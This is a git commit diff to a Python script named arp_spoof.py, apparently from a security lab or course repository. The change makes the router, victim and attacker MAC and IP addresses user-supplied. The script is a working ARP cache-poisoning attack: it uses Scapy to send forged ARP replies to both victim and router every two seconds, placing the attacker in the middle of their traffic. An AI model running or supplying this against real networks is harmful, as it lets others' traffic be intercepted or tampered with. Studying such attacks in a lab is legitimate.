8b0d8024851f55c83bfdfb61b7ecf62be0eb2394
TalAkav <talakav5205@gmail.com>
2026-01-21 14:35:16 +0200

    fix(attack/arp_spoof): user input

--- code/attack/arp_spoof.py
+++ code/attack/arp_spoof.py
@@ -4,28 +4,24 @@ from time import sleep
 from threading import Thread
 
 
-router_ip = "192.168.1.1"        # Router IP
-router_mac = "0c:b9:37:86:7b:7b" # Router MAC
-attacker_mac = "CC:47:40:F6:21:E6" # Attacker MAC
-
-victim_ip = "192.168.1.10"      # Victim IP
-victim_mac = "b8:81:98:87:11:99" # Victim MAC
+attacker_mac = input("Enter Attacker MAC addr: ") or "CC:47:40:F6:21:E6"
+router_ip = input("Enter Router IP addr: ") or "192.168.1.1"
+router_mac = input("Enter Router MAC addr: ") or "0c:b9:37:86:7b:7b"
+victim_ip = input("Enter Victim IP addr: ") or "192.168.1.10"
+victim_mac = input("Enter Victim MAC addr: ") or "b8:81:98:87:11:99"
 
 # Craft ARP reply to victim: "Router is at Attacker_MAC"
 arp_to_victim = ARP(op=2, psrc=router_ip, hwsrc=attacker_mac, pdst=victim_ip, hwdst=victim_mac)
 # Craft ARP reply to router: "Victim is at Attacker_MAC"
 arp_to_router = ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac, pdst=router_ip, hwdst=router_mac)
 
-
 def spoof():
     while True:
-        print("[*] Starting ARP spoof...")
         send(arp_to_victim, verbose=False)
         send(arp_to_router, verbose=False)
         sleep(2)
 
 
 if __name__ == "__main__":
-    Thread(target=spoof, daemon=True).start()
-    while True:
-        exec(input(">>> "))
+    print("Starting ARP spoof")
+    spoof()
